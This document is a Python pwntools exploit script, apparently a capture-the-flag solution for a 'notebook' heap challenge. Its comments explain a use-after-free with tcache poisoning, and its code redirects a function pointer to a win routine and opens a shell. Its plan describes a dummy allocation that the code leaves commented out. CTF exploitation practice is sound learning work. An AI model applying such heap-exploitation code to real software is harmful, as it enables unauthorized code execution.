#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13543)
    return process(elf.path)

p = conn()

# as the previous challenge, there is a UAF. notes[i] is never set to NULL. however, we have two ways to interact with it:
# 1. UAF Write: Option 3 (edit) allows you to write up to 0x60 bytes into the freed chunk
# 2. UAF Read: Option 4 (show) prints the first 16 (0x10) bytes of the freed chunk 

# theoretical path
#1. Allocate & Free: Create a note (e.g., at index 0) and then free it. It is now at the top of the Tcache. Its first 8 bytes 
# point to NULL (or the previous chunk).
# 2. Poison the Tcache: Use the edit function on index 0. Send a payload where the first 8 bytes contain the exact memory address 
# of the global_handler variable.
# 3. Allocate (Dummy): Create a new note. The heap manager gives you back your original chunk. Crucially, it reads the forged next 
# pointer you wrote in step 2 and updates the Tcache to believe that the next available free chunk is located at the address of 
# global_handler.
# 4. Allocate (Target): Create another new note. The heap manager will now return a chunk that starts exactly at the global_handler 
# variable.
# 5. Overwrite & Trigger: Use edit on this newest note to write the memory address of the win function. Finally, select trigger to
# pop a shell or read the flag.

win_addr = elf.sym.win
global_handler = elf.sym.global_handler

# allocate a note at index 0
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'0')
p.sendafter(b'data: ', b'A' * 8)   # chunk A

# free the note at index 0
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'index: ', b'0')

# edit note 0 to write the address of global_handler
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'index: ', b'0')
p.sendafter(b'data: ', p64(global_handler))

# serve the first allocation (dummy)
#p.sendlineafter(b'> ', b'1')
#p.sendlineafter(b'index: ', b'1')
#p.sendafter(b'data: ', b'B' * 8)   # chunk

# serve the second allocation (target)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'1')
p.sendafter(b'data: ', p64(win_addr))   # chunk at global_handler

# trigger the win function
p.sendlineafter(b'> ', b'5')


p.interactive()
